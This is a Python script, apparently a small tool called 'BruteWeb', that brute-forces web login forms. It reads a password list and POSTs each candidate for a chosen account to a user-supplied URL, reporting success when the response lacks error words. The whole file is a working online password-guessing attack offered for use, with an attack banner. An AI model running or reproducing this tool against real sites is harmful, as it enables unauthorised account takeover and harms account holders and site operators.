import requests, sys, os, time
import threading, argparse
req = requests
url = "https://dashboard.87-hunter.repl.co/oauth"

lgr='\033[1;32m' 
red='\033[0;31m' 
cyan='\033[36m' 
blue='\033[34m'
NC='\033[0m'
banner = f"""{red}
  ____             _     __        __   _     
 | __ ) _ __ _   _| |_ __\ \      / /__| |__  
 |  _ \| '__| | | | __/ _ \ \ /\ / / _ \ '_ \ 
 | |_) | |  | |_| | ||  __/\ V  V /  __/ |_) |
 |____/|_|   \__,_|\__\___| \_/\_/ \___|_.__/ 
                                             
                          {lgr}-By hunter87ff 
{NC}"""
print(banner)


# parser = argparse.ArgumentParser(usage="%(prog)s -u <url> [-t]  <target-variable> -d <email/username> [-pass] <password-parameter>\nExample:- %(prog)s -u https://example.com/login -t email -d hunter87@hunter87.me -password")
# parser.add_argument('-u',help='enter the target url.', type=str)
# parser.add_argument('-email', '-username',help='Target email or username', type=str)
# parser.add_argument('-pass', '-password', '-psw', '-secret',metavar="<password parameter>" ,type=str,help='Enter the password parameter for the url acceptance')

# args = parser.parse_args()
# if not args.u: print("Required url missed"); sys.exit()
# if not args.email or not args.username: print("Enter the password parameter for the url acceptance"); sys.exit()
# # if not args.username: self.username = args.username
# if not args.password or not args.Pass or not args.psw: print("Enter the password parameter for the url acceptance"); sys.exit()


def is_incorrect(res):
	error = ["incorrect", "wrong", "invalid", "not found"]
	for err in error:
		if err in res.lower():
			return True

def crack(url, target, dest, psw):
	count = 1
	for i in psw:
		data = {f"{target}":f"{dest}", "pass":f"{i}"}
		res = req.post(url, data, timeout=1).text
		if is_incorrect(res):
			print(f"{count}) Failed {i}")
		else:
			print(f"{lgr}Password Is : {i}{NC}")
			return True
		count += 1


def main():
	url = input("Enter Url : ")
	target = input("Target (eg: email, username): ")
	dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
	passw = input("Password parameter (eg: pass, psw, password) :")
	chunk = 10000
	load = f"""{red}Starting Attack : 
█████████████████████████████████████████████████\n"""
	for x in load:
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.02)
	with open("passwords.txt", "r") as f:
		passwords = f.read().split("\n")[0:chunk]
		t = threading.Thread(target=crack, args=(url, target, dest, passwords, ))
		t.start()

main()